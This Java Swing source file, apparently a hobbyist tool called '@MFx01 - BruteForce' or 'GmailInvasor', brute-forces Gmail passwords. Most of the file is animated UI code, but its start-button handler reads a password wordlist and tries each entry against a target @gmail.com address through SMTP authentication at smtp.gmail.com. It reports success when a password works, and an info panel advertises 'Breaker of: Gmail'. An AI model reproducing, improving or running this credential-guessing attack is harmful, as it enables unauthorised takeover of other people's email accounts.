package prog.bruteforce;

import java.awt.Color;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URL;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;
import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JEditorPane;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.border.EtchedBorder;

import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.HtmlEmail;
import org.apache.commons.mail.SimpleEmail;

public class GmailInvasor extends JFrame{
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	public boolean connect = false;
	private String memory2 = "";
	private String memory = "";
	private String memory1 = "";
	private static int memory0 = 0;
	public JEditorPane editorPane;
	public String pass;
	public static String pass1;
	public JFrame frame;
	public boolean connect1 = true;
	public JLabel labelImg;
	public boolean startConnection = false;
	public boolean texts = false;
	
	public static void main(String[] string) throws IOException, LineUnavailableException, UnsupportedAudioFileException, InterruptedException{
		
		GmailInvasor gI = new GmailInvasor();
		gI.setVisible(true);
		
		
			URL file;
			Clip oClip = null;
			
				// Carrega o arquivo de áudio (não funciona com .mp3, só .wav) 
			      file = new File("").getClass().getResource("/sounds/1.wav");
			        oClip = AudioSystem.getClip();
			        AudioInputStream oStream = AudioSystem.getAudioInputStream(file);
			        oClip.open(oStream);

			        //oClip.loop(0); // Toca uma vez
			        
			       oClip.loop(Clip.LOOP_CONTINUOUSLY); // Toca continuamente (para o caso de músicas)

	}
	

	
	public GmailInvasor(){
		
		frame = new JFrame();
		
		this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		this.setTitle("@MFx01 - BruteForce");
		this.setBounds(350, 150, 350, 400);
		this.setResizable(false);
		JPanel panel = new JPanel();
		this.add(panel);
		
		URL url = this.getClass().getResource("/img/icon.jpg");  
		Image iconeTitulo = Toolkit.getDefaultToolkit().getImage(url);  
		this.setIconImage(iconeTitulo);
		JLabel frameLabel = new JLabel();
		frameLabel.setText("<html><div width='350' height='400'></div></html>");
		frameLabel.setBounds(0, 2, 380, 55);
		panel.add(frameLabel);
		
		ImageIcon image = new ImageIcon(getClass().getResource("/img/binarios.jpg"));
		ImageIcon init3 = new ImageIcon(getClass().getResource("/img/init3.jpg"));
		ImageIcon init1 = new ImageIcon(getClass().getResource("/img/init1.jpg"));
		ImageIcon init2 = new ImageIcon(getClass().getResource("/img/init2.jpg"));
		ImageIcon init4 = new ImageIcon(getClass().getResource("/img/init4.jpg"));
		ImageIcon init5 = new ImageIcon(getClass().getResource("/img/init5.jpg"));
		ImageIcon init6 = new ImageIcon(getClass().getResource("/img/init6.jpg"));
		ImageIcon init7 = new ImageIcon(getClass().getResource("/img/init7.jpg"));
		ImageIcon init8 = new ImageIcon(getClass().getResource("/img/init8.jpg"));
		ImageIcon init9 = new ImageIcon(getClass().getResource("/img/init9.jpg"));
		ImageIcon init10 = new ImageIcon(getClass().getResource("/img/init10.jpg"));
		ImageIcon init11 = new ImageIcon(getClass().getResource("/img/init11.jpg"));
		ImageIcon init12 = new ImageIcon(getClass().getResource("/img/init12.jpg"));
		ImageIcon init13 = new ImageIcon(getClass().getResource("/img/init13.jpg"));
		ImageIcon init14 = new ImageIcon(getClass().getResource("/img/init14.jpg"));
		ImageIcon init15 = new ImageIcon(getClass().getResource("/img/init15.jpg"));
		ImageIcon init16 = new ImageIcon(getClass().getResource("/img/init16.jpg"));
		ImageIcon init17 = new ImageIcon(getClass().getResource("/img/init17.jpg"));
		ImageIcon config2 = new ImageIcon(getClass().getResource("/img/config2.jpg"));
		ImageIcon config3 = new ImageIcon(getClass().getResource("/img/config3.jpg"));
		ImageIcon config4 = new ImageIcon(getClass().getResource("/img/config4.jpg"));
		ImageIcon config5 = new ImageIcon(getClass().getResource("/img/config5.jpg"));
		ImageIcon configs1= new ImageIcon(getClass().getResource("/img/configs1.jpg"));
		ImageIcon configs2 = new ImageIcon(getClass().getResource("/img/configs2.jpg"));
		ImageIcon configs3 = new ImageIcon(getClass().getResource("/img/configs3.jpg"));
		ImageIcon configs4 = new ImageIcon(getClass().getResource("/img/configs4.jpg"));
		ImageIcon configs5 = new ImageIcon(getClass().getResource("/img/configs5.jpg"));
		ImageIcon configs6 = new ImageIcon(getClass().getResource("/img/configs6.jpg"));
		ImageIcon configs7 = new ImageIcon(getClass().getResource("/img/configs7.jpg"));
		ImageIcon configs8 = new ImageIcon(getClass().getResource("/img/configs8.jpg"));
		ImageIcon configs9 = new ImageIcon(getClass().getResource("/img/configs9.jpg"));
		ImageIcon configs10 = new ImageIcon(getClass().getResource("/img/configs10.jpg"));
		ImageIcon configs11 = new ImageIcon(getClass().getResource("/img/configs11.jpg"));
		ImageIcon configs12 = new ImageIcon(getClass().getResource("/img/configs12.jpg"));
		ImageIcon configs13 = new ImageIcon(getClass().getResource("/img/configs13.jpg"));
		ImageIcon configs14 = new ImageIcon(getClass().getResource("/img/configs14.jpg"));
		ImageIcon configs15 = new ImageIcon(getClass().getResource("/img/configs15.jpg"));
		ImageIcon configs16 = new ImageIcon(getClass().getResource("/img/configs16.jpg"));
		ImageIcon configs17 = new ImageIcon(getClass().getResource("/img/configs17.jpg"));
		ImageIcon configs18 = new ImageIcon(getClass().getResource("/img/configs18.jpg"));
		ImageIcon configs19 = new ImageIcon(getClass().getResource("/img/configs19.jpg"));
		ImageIcon configs20 = new ImageIcon(getClass().getResource("/img/configs20.jpg"));
		ImageIcon configs21 = new ImageIcon(getClass().getResource("/img/configs21.jpg"));
		ImageIcon configs22 = new ImageIcon(getClass().getResource("/img/configs22.jpg"));
		ImageIcon panel1 = new ImageIcon(getClass().getResource("/img/panel1.jpg"));
		ImageIcon panel2 = new ImageIcon(getClass().getResource("/img/panel2.jpg"));
		ImageIcon panel3 = new ImageIcon(getClass().getResource("/img/panel3.jpg"));
		ImageIcon panel4 = new ImageIcon(getClass().getResource("/img/panel4.jpg"));
		ImageIcon panel5 = new ImageIcon(getClass().getResource("/img/panel5.jpg"));
		ImageIcon panel6 = new ImageIcon(getClass().getResource("/img/panel6.jpg"));
		ImageIcon panel7 = new ImageIcon(getClass().getResource("/img/panel7.jpg"));
		ImageIcon panel8 = new ImageIcon(getClass().getResource("/img/panel8.jpg"));
		ImageIcon panel9 = new ImageIcon(getClass().getResource("/img/panel9.jpg"));
		ImageIcon pn2 = new ImageIcon(getClass().getResource("/img/pn2.jpg"));
		ImageIcon pn3 = new ImageIcon(getClass().getResource("/img/pn3.jpg"));
		ImageIcon pn4 = new ImageIcon(getClass().getResource("/img/pn4.jpg"));
		ImageIcon pn5 = new ImageIcon(getClass().getResource("/img/pn5.jpg"));
		ImageIcon pn6 = new ImageIcon(getClass().getResource("/img/pn6.jpg"));
		ImageIcon pn7 = new ImageIcon(getClass().getResource("/img/pn7.jpg"));
		ImageIcon pn8 = new ImageIcon(getClass().getResource("/img/pn8.jpg"));
		ImageIcon pn9 = new ImageIcon(getClass().getResource("/img/pn9.jpg"));
		ImageIcon pn10 = new ImageIcon(getClass().getResource("/img/pn10.jpg"));
		ImageIcon pn11 = new ImageIcon(getClass().getResource("/img/pn11.jpg"));
		ImageIcon pn12 = new ImageIcon(getClass().getResource("/img/pn12.jpg"));
		ImageIcon pn13 = new ImageIcon(getClass().getResource("/img/pn13.jpg"));
		ImageIcon pn14 = new ImageIcon(getClass().getResource("/img/pn14.jpg"));
		ImageIcon pn15 = new ImageIcon(getClass().getResource("/img/pn15.jpg"));
		ImageIcon pn30 = new ImageIcon(getClass().getResource("/img/pn30.jpg"));
		ImageIcon pn31 = new ImageIcon(getClass().getResource("/img/pn31.jpg"));
		ImageIcon pn32 = new ImageIcon(getClass().getResource("/img/pn32.jpg"));
		ImageIcon pn33 = new ImageIcon(getClass().getResource("/img/pn33.jpg"));
		ImageIcon pn34 = new ImageIcon(getClass().getResource("/img/pn34.jpg"));
		ImageIcon pn35 = new ImageIcon(getClass().getResource("/img/pn35.jpg"));
		ImageIcon pn36 = new ImageIcon(getClass().getResource("/img/pn36.jpg"));
		ImageIcon pn37 = new ImageIcon(getClass().getResource("/img/pn37.jpg"));
		ImageIcon pn38 = new ImageIcon(getClass().getResource("/img/pn38.jpg"));
		ImageIcon pn39 = new ImageIcon(getClass().getResource("/img/pn39.jpg"));
		ImageIcon pn40 = new ImageIcon(getClass().getResource("/img/pn40.jpg"));
		ImageIcon info1 = new ImageIcon(getClass().getResource("/img/info1.jpg"));
		
		labelImg = new JLabel();
		labelImg.setIcon(image);;
		labelImg.setBounds(0, 2, 350, 400);
		frameLabel.add(labelImg);
		
		JLabel labelImg1 = new JLabel(panel1);
		labelImg1.setBounds(0, 2, 860, 45);
		labelImg.add(labelImg1);
		
		new Thread(new Runnable(){
			public void run(){
				while(true){
				for(int j = 0; j <= 9; j++){
					try {
						Thread.sleep(500);
					} catch (InterruptedException e) {
						
						e.printStackTrace();
					}
					if(j == 0){
						labelImg1.setIcon(panel2);
					}
					else
					if(j == 1){
						labelImg1.setIcon(panel3);
					}else 
					if(j == 2){
						labelImg1.setIcon(panel4);
					}else
					if(j == 3){
						labelImg1.setIcon(panel5);
					}else
					if(j == 4){
						labelImg1.setIcon(panel6);
					}else
					if(j == 5){
						labelImg1.setIcon(panel7);
					}else
					if(j == 6){
						labelImg1.setIcon(panel8);
					}else
					if(j == 7){
						labelImg1.setIcon(panel9);
					}
				}
				
				for(int k = 2; k <= 15; k++){
					try {
						Thread.sleep(25);
					} catch (InterruptedException e) {
						
						e.printStackTrace();
					}
					if(k == 2){
						labelImg1.setIcon(pn2);
					}
					else
					if(k == 3){
						labelImg1.setIcon(pn3);
					}else 
					if(k == 4){
						labelImg1.setIcon(pn4);
					}else
					if(k == 5){
						labelImg1.setIcon(pn5);
					}else
					if(k == 6){
						labelImg1.setIcon(pn6);
					}else
					if(k == 7){
						labelImg1.setIcon(pn7);
					}else
					if(k == 8){
						labelImg1.setIcon(pn8);
					}else
					if(k == 9){
						labelImg1.setIcon(pn9);
					}
					else
						if(k == 10){
							labelImg1.setIcon(pn10);
						}else 
						if(k == 11){
							labelImg1.setIcon(pn11);
						}else
						if(k == 12){
							labelImg1.setIcon(pn12);
						}else
						if(k == 13){
							labelImg1.setIcon(pn13);
						}else
							if(k == 14){
								labelImg1.setIcon(pn14);
							}else
								if(k == 15){
									labelImg1.setIcon(pn15);
								}
				}
				
				for(int l = 1; l <= 11; l++){
					try {
						Thread.sleep(50);
					} catch (InterruptedException e) {
						
						e.printStackTrace();
					}
					
					if(l == 1){
						labelImg1.setIcon(pn30);
					}else 
					if(l == 2){
						labelImg1.setIcon(pn31);
					}else
					if(l == 3){
						labelImg1.setIcon(pn32);
					}else
					if(l == 4){
						labelImg1.setIcon(pn33);
					}else
					if(l == 5){
						labelImg1.setIcon(pn34);
					}else
					if(l == 6){
						labelImg1.setIcon(pn35);
					}else
					if(l == 7){
						labelImg1.setIcon(pn36);
					}
					else
						if(l == 8){
							labelImg1.setIcon(pn37);
						}else 
						if(l == 9){
							labelImg1.setIcon(pn38);
						}else
						if(l == 10){
							labelImg1.setIcon(pn39);
						}else
							if(l == 11){
								labelImg1.setIcon(pn40);
							}
				}
				}
			}
		}).start();
		
		JLabel init = new JLabel();
		//init.setText("initialize");
		init.setForeground(Color.red);
		init.setBounds(15, 47, 50, 20);
		frameLabel.add(init);
		
		JTextField wordlist = new JTextField();
		wordlist.setBounds(120, 100, 200, 20);
		wordlist.setBackground(Color.black);
		wordlist.setCaretColor(Color.green);
		wordlist.setForeground(Color.green);
		labelImg.add(wordlist);
		
		
		JTextField textField = new JTextField();
		textField.setBounds(120, 127, 200, 20);
		textField.setBackground(Color.black);
		textField.setForeground(Color.green);
		textField.setCaretColor(Color.green);
		textField.setVisible(true);
		labelImg.add(textField);
		
		JTextField listCreate = new JTextField();
		listCreate.setBounds(120, 100, 200, 20);
		listCreate.setBackground(Color.black);
		listCreate.setForeground(Color.green);
		listCreate.setCaretColor(Color.green);
		listCreate.setVisible(false);
		labelImg.add(listCreate);
		
		JButton create = new JButton();
		create.setBounds(50, 127, 100, 20);
		create.setText("Gerar");
		create.setBackground(Color.black);
		create.setForeground(Color.white);
		create.setVisible(false);
		labelImg.add(create);
		
		JButton open = new JButton();
		open.setBounds(180, 127, 100, 20);
		open.setText("Abrir");
		open.setBackground(Color.black);
		open.setForeground(Color.white);
		open.setVisible(true);
		labelImg.add(open);
		
		JButton button = new JButton();
		button.setBounds(100, 150, 100, 20);
		button.setText("Iniciar");
		button.setBackground(Color.black);
		button.setForeground(Color.white);
		button.setVisible(true);
		labelImg.add(button);
		
		JLabel progress = new JLabel();
		progress.setBounds(10, 180, 250, 30);
		progress.setBackground(Color.black);
		progress.setForeground(Color.white);
		progress.setText(null);
		labelImg.add(progress);
		
		editorPane = new JEditorPane();
		editorPane.setContentType("text/html");
		editorPane.setEditable(true);
		editorPane.setBackground(Color.black);
		labelImg.add(editorPane);
		JScrollPane scrollEditor = new JScrollPane(editorPane);
		scrollEditor.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
		scrollEditor.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollEditor.setBorder(BorderFactory.createEtchedBorder(EtchedBorder.LOWERED));
		scrollEditor.setBounds(15, 200, 320, 160);
		
	
		labelImg.add(scrollEditor);
		
		JTextPane textArea = new JTextPane();
		textArea.setBackground(Color.black);
		textArea.setForeground(Color.green);
		textArea.setCaretColor(Color.green);
		textArea.setVisible(false);
		labelImg.add(textArea);
		JScrollPane scrollArea = new JScrollPane(textArea);
		scrollArea.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
		scrollArea.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollArea.setBorder(BorderFactory.createEtchedBorder(EtchedBorder.LOWERED));
		scrollArea.setBounds(15, 200, 320, 160);
		scrollArea.setVisible(false);
		labelImg.add(scrollArea);
		 
		
		
		open.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				
				String path = new File("").getAbsolutePath();
				File dir = new File(path+"\\");
				File aDir[] = dir.listFiles();
				int i = 0;
				memory = "";
				for(int j = aDir.length; i < j; i++){
					File arquivos = aDir[i];
					String ars = arquivos.getName();
					
					memory += ars;
				}
				if(!listCreate.getText().isEmpty()){
					if(memory.contains(listCreate.getText()+".txt")){
				try {
					File files = new File(path+"\\"+listCreate.getText()+".txt");
					FileReader fileR = new FileReader(files);
					BufferedReader bufR = new BufferedReader(fileR);
					String ready = bufR.readLine();
					
					while(ready != null){
						memory2 += ready + "\r\n";
						textArea.setText(memory2);
						ready = bufR.readLine();
						
					}
					bufR.close();
				} catch (FileNotFoundException e1) {
					
					e1.printStackTrace();
				} catch (IOException e1) {
				
					e1.printStackTrace();
				}
				
					}else{
						JOptionPane.showMessageDialog(frame, "<html><font color='red'>O arquivo '"+listCreate.getText()+"' não foi encontrado!</font></html>");
					}
					
				}else{
					JOptionPane.showMessageDialog(frame, "<html><font color='red'>Insire uma wordlist no campo.</font></html>");
				}
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				open.setBackground(Color.black);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				open.setBackground(Color.green);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		create.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				
				
				String paths = new File("").getAbsolutePath();
				if(!listCreate.getText().isEmpty()){
					
						FileWriter FileWriter;
						try {
							FileWriter = new FileWriter(paths+"\\"+listCreate.getText()+".txt");
							FileWriter.write(textArea.getText());
							FileWriter.close();
						} catch (IOException e1) {
							
							e1.printStackTrace();
						}
					
					new Thread(new Runnable(){
						public void run(){
						
					
						textArea.setText("arquivo salvo com sucesso!");
						try {
							Thread.sleep(2000);
						} catch (InterruptedException e1) {
							
							e1.printStackTrace();
						}
						
						textArea.setForeground(Color.green);
						textArea.setText("");
						}
						
					}).start();
					
					}
					
				else{
					JOptionPane.showMessageDialog(frame, "<html><font color='red'>Insire uma wordlist no campo.</font></html>");
				}
					
					
					
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				create.setBackground(Color.black);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				create.setBackground(Color.green);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		JLabel version = new JLabel();
		version.setText("<html><div style='background-color: black;width:200;height:180;'><font color='red'>version:  beta 1.0"
					+ "<br>Type:  BruteForce"
					+ "<br>Name:  @MFx01"
					+ "<br>Update:  none"
					+ "<br>Breaker of: Gmail"
					+"<br>maker by: Lord X"
					+"<br>company: (BFT)Brute Force Technology"
					+ "<br>current server: smtp.gmail.com"
					+ "<br>Search processing: from 1,5s to 2.5s"
					+ "<br>Processing: </font><font color='red'>no</font></div></html>");
		
		
		version.setBounds(57, 98, 300, 200);
		version.setVisible(false);
		labelImg.add(version);
		
		init.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				editorPane.setVisible(true);
				scrollEditor.setVisible(true);
				textArea.setVisible(false);
				scrollArea.setVisible(false);
				wordlist.setVisible(true);
				textField.setVisible(true);
				button.setVisible(true);
				progress.setVisible(true);
				open.setVisible(false);
				listCreate.setVisible(false);
				create.setVisible(false);
				version.setVisible(false);
				new Thread(new Runnable(){
					public void run(){
						for(int j = 1; j <= 21; j++){
							try {
								Thread.sleep(62);
							} catch (InterruptedException e) {
								
								e.printStackTrace();
							}
							
							if(j == 1){
								labelImg.setIcon(init3);
							}else 
							if(j == 2){
								labelImg.setIcon(init1);
							}else
							if(j == 3){
								labelImg.setIcon(init2);
							}else
							if(j == 4){
								labelImg.setIcon(init4);
							}else
							if(j == 5){
								labelImg.setIcon(init5);
							}else
							if(j == 6){
								labelImg.setIcon(init6);
							}else
							if(j == 7){
								labelImg.setIcon(init7);
							}else
							if(j == 8){
								labelImg.setIcon(init8);
							}else
							if(j == 9){
								labelImg.setIcon(init9);
							}else
							if(j == 10){
								labelImg.setIcon(init10);
							}else
							if(j == 11){
								labelImg.setIcon(init11);
							}else
							if(j == 12){
								labelImg.setIcon(init12);
							}else
							if(j == 13){
								labelImg.setIcon(init13);
							}else
							if(j == 14){
								labelImg.setIcon(init14);
							}else
							if(j == 15){
								labelImg.setIcon(init15);
							}else
							if(j == 16){
								labelImg.setIcon(init16);
							}else
							if(j == 17){
								labelImg.setIcon(init17);
							}else
							if(j == 18){
								labelImg.setIcon(config2);
							}else
							if(j == 19){
								labelImg.setIcon(config3);
							}else
							if(j == 20){
								labelImg.setIcon(config4);
							}else
							if(j == 21){
								labelImg.setIcon(config5);
							}
						}													
						
						
					}
				}).start();
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
			
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		JLabel conf = new JLabel();
		//conf.setText("Configurations");
		conf.setForeground(Color.blue);
		conf.setBounds(125, 45, 110, 20);
		labelImg.add(conf);
		
		conf.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				editorPane.setVisible(false);
				scrollEditor.setVisible(false);
				textArea.setVisible(true);
				scrollArea.setVisible(true);
				wordlist.setVisible(false);
				progress.setVisible(false);
				open.setVisible(true);
				textField.setVisible(false);
				button.setVisible(false);
				listCreate.setVisible(true);
				create.setVisible(true);
				version.setVisible(false);
				new Thread(new Runnable(){
					public void run(){
						for(int j = 1; j <= 22; j++){
							try {
								Thread.sleep(62);
							} catch (InterruptedException e) {
								
								e.printStackTrace();
							}
							
							if(j == 1){
								labelImg.setIcon(configs1);
							}else 
							if(j == 2){
								labelImg.setIcon(configs2);
							}else
							if(j == 3){
								labelImg.setIcon(configs3);
							}else
							if(j == 4){
								labelImg.setIcon(configs4);
							}else
							if(j == 5){
								labelImg.setIcon(configs5);
							}else
							if(j == 6){
								labelImg.setIcon(configs6);
							}else
							if(j == 7){
								labelImg.setIcon(configs7);
							}else
							if(j == 8){
								labelImg.setIcon(configs8);
							}else
							if(j == 9){
								labelImg.setIcon(configs9);
							}else
							if(j == 10){
								labelImg.setIcon(configs10);
							}else
							if(j == 11){
								labelImg.setIcon(configs11);
							}else
							if(j == 12){
								labelImg.setIcon(configs12);
							}else
							if(j == 13){
								labelImg.setIcon(configs13);
							}else
							if(j == 14){
								labelImg.setIcon(configs14);
							}else
							if(j == 15){
								labelImg.setIcon(configs15);
							}else
							if(j == 16){
								labelImg.setIcon(configs16);
							}else
							if(j == 17){
								labelImg.setIcon(configs17);
							}else
							if(j == 18){
								labelImg.setIcon(configs18);
							}else
							if(j == 19){
								labelImg.setIcon(configs19);
							}else
							if(j == 20){
								labelImg.setIcon(configs20);
							}else
							if(j == 21){
								labelImg.setIcon(configs21);
							}else
							if(j == 22){
								labelImg.setIcon(configs22);
							}
						}													
						
						
					}
				}).start();
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
			
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
			
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
			}
		});
		
		JLabel info = new JLabel();
		//conf.setText("Informations");
		info.setForeground(Color.blue);
		info.setBounds(260, 45, 110, 20);
		labelImg.add(info);
		
		
		info.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				editorPane.setVisible(false);
				scrollEditor.setVisible(false);
				textArea.setVisible(false);
				scrollArea.setVisible(false);
				wordlist.setVisible(false);
				progress.setVisible(false);
				textField.setVisible(false);
				button.setVisible(false);
				listCreate.setVisible(false);
				create.setVisible(false);
				open.setVisible(false);
				version.setVisible(true);
				new Thread(new Runnable(){
					public void run(){
						for(int j = 0; j <= 22; j++){
							try {
								Thread.sleep(62);
							} catch (InterruptedException e) {
								
								e.printStackTrace();
							}
							if(j == 0){
								labelImg.setIcon(info1);
							}
							else
							if(j == 1){
								labelImg.setIcon(configs1);
							}else 
							if(j == 2){
								labelImg.setIcon(configs2);
							}else
							if(j == 3){
								labelImg.setIcon(configs3);
							}else
							if(j == 4){
								labelImg.setIcon(configs4);
							}else
							if(j == 5){
								labelImg.setIcon(configs5);
							}else
							if(j == 6){
								labelImg.setIcon(configs6);
							}else
							if(j == 7){
								labelImg.setIcon(configs7);
							}else
							if(j == 8){
								labelImg.setIcon(configs8);
							}else
							if(j == 9){
								labelImg.setIcon(configs9);
							}else
							if(j == 10){
								labelImg.setIcon(configs10);
							}else
							if(j == 11){
								labelImg.setIcon(configs11);
							}else
							if(j == 12){
								labelImg.setIcon(configs12);
							}else
							if(j == 13){
								labelImg.setIcon(configs13);
							}else
							if(j == 14){
								labelImg.setIcon(configs14);
							}else
							if(j == 15){
								labelImg.setIcon(configs15);
							}else
							if(j == 16){
								labelImg.setIcon(configs16);
							}else
							if(j == 17){
								labelImg.setIcon(configs17);
							}else
							if(j == 18){
								labelImg.setIcon(configs18);
							}else
							if(j == 19){
								labelImg.setIcon(configs19);
							}else
							if(j == 20){
								labelImg.setIcon(configs20);
							}else
							if(j == 21){
								labelImg.setIcon(configs21);
							}else
							if(j == 22){
								labelImg.setIcon(configs22);
							}
						}													
						
						
					}
				}).start();
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		
		
		
		JLabel label = new JLabel();
		label.setBounds(0, 180, 250, 20);
		labelImg.add(label);
		
		
		
		
		
		
		button.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
			
				editorPane.setText("");
				
				String path = new File("").getAbsolutePath();
				File dir = new File(path+"\\");
				File aDir[] = dir.listFiles();
				int i = 0;
				for(int j = aDir.length; i < j; i++){
					File arquivos = aDir[i];
					String ars = arquivos.getName();
					
					memory += ars;
				}
				
				//#1 Quantidade de senhas
				
				FileReader fileReader;
				try {
					fileReader = new FileReader(path+"\\"+wordlist.getText()+".txt");
					BufferedReader bufReader = new BufferedReader(fileReader);
					pass1 = bufReader.readLine();
					
					while(pass1 != null){
						memory0 += 1;
						pass1 = bufReader.readLine();
					}
					bufReader.close();
				} catch (FileNotFoundException e5) {
					
					e5.printStackTrace();
				}
				catch (IOException e1) {
					
					e1.printStackTrace();
				}
				//Final #1
				
				
				Runnable run1 = new Runnable(){
					@SuppressWarnings("deprecation")
					public void run(){
						String path = new File("").getAbsolutePath();
						try {
							
							//leitura da wordlist
							FileReader fileReader = new FileReader(path+"\\"+wordlist.getText()+".txt");
							BufferedReader bufReader = new BufferedReader(fileReader);
							pass = bufReader.readLine();
							
							
							while(connect == false & pass != null){
								
								
								//autenticação email
								HtmlEmail email = new HtmlEmail();
								   
								   email.setHostName("smtp.gmail.com");
								   email.setSmtpPort(465);
								   try {
									email.addTo(textField.getText(), "X");
								} catch (EmailException e3) {
									
									e3.printStackTrace();
								}
								   try {
									email.setSSLOnConnect(true);
									email.setFrom(textField.getText(), "X");
								} catch (EmailException e2) {
									
									e2.printStackTrace();
								}
								   email.setSubject("Teste BruteForce");
								   try {
									email.setMsg("<font color='blue'>A senha foi encontrada, o BruteForce foi executado com sucesso!</font>");
								} catch (EmailException e1) {
									
									e1.printStackTrace();
								}
								   connect = false;
								   email.setSSL(true);
								   email.setAuthentication(textField.getText(), pass);
								   try {
									email.send();
									connect = true;
									
								} catch (EmailException e1) {
									
									e1.printStackTrace();
								}
								
								   
								   if(connect == true){
									   	
										editorPane.setText("<font color='green'>A senha: "+pass+" foi quebrada com sucesso!</font>");
										
										break;
									 }else{
									
										
											 memory1 += "A senha: "+pass+" não foi encontrada!"+"<br>";
											editorPane.setText("<font color='red'>"+memory1+"</font>");
											
											
									 }
								
								  
								//Autenticação email
								pass = bufReader.readLine();
							}
							bufReader.close();
							version.setText("<html><div style='background-color: black;width:200;height:180;'><font color='red'>version:  beta 1.0"
									+ "<br>Type:  BruteForce"
									+ "<br>Name:  @MFx01"
									+ "<br>Update:  none"
									+ "<br>Breaker of: Gmail"
									+"<br>maker by: Lord X"
									+"<br>company: (BFT)Brute Force Technology"
									+ "<br>current server: smtp.gmail.com"
									+ "<br>Search processing: Between 1,5s and 2.5s"
									+ "<br>Processing: </font><font color='red'>no</font></div></html>");
							  
							  
							
							
								
							
						} catch (FileNotFoundException e4) {
							
			
						} 
						catch (IOException e1) {}
					}
				};
				
				
				
				Runnable run2 = new Runnable(){
					public void run(){
						int oneSec = 1000;
						int twoSec = 7200;
						int porcent = 100;
						int num = 2;
						
						int num0 = memory0 - 2;
						int num1 = porcent / num0;
						int num2 = oneSec / num1;
						
						int num3 = porcent / num;
						int num4 = twoSec / num3;
						int num5 = num2 + num4;
						int i;
						for(i = 0; i <= porcent; i++){
							try {
								Thread.sleep(num5);
							} catch (InterruptedException e) {
							
								e.printStackTrace();
							}
							
							if(connect == true){
								break;
							}
							
							progress.setText("Progresso da leitura: "+i+"%");
						}
						i = 0;
						
					}
				};
				
				if(!wordlist.getText().isEmpty()){
					if(!textField.getText().isEmpty()){
						if(textField.getText().contains("@gmail.com")){
							if(memory.contains(wordlist.getText()+".txt")){
								version.setText("<html><div style='background-color: black;width:200;height:180;'><font color='red'>version:  beta 1.0"
										+ "<br>Type:  BruteForce"
										+ "<br>Name:  @MFx01"
										+ "<br>Update:  none"
										+ "<br>Breaker of: Gmail"
										+"<br>maker by: Lord X"
										+"<br>company: (BFT)Brute Force Technology"
										+ "<br>current server: smtp.gmail.com"
										+ "<br>Search processing: Between 1,5s and 2.5s"
										+ "<br>Processing: </font><font color='blue'>yes</font></div></html>");
								new Thread(run2).start();
								new Thread(run1).start();
							}else{
								JOptionPane.showMessageDialog(frame, "<html><font color='red'>O arquivo '"+wordlist.getText()+"' não foi encontrado!</font></html>");
							}
						}else{
							JOptionPane.showMessageDialog(frame, "<html><font color='red'>O email está incorreto, por favor, corriga-o!</font></html>");

						}
						
					}else{
						JOptionPane.showMessageDialog(frame, "<html><font color='red'>Preencha o email!</font></html>");

					}
					
				}else{
					JOptionPane.showMessageDialog(frame, "<html><font color='red'>Preencha a Wordlist!</font></html>");

				}
				
				
				
				connect = false;
				memory1 = "";
				memory0 = 0;
				pass = "";
				pass1 = "";
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {

				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				
				button.setBackground(Color.black);
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				button.setBackground(Color.green);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
			
				
			}
		});
		
		
		
		
		
	}
	
	
	
	
	
}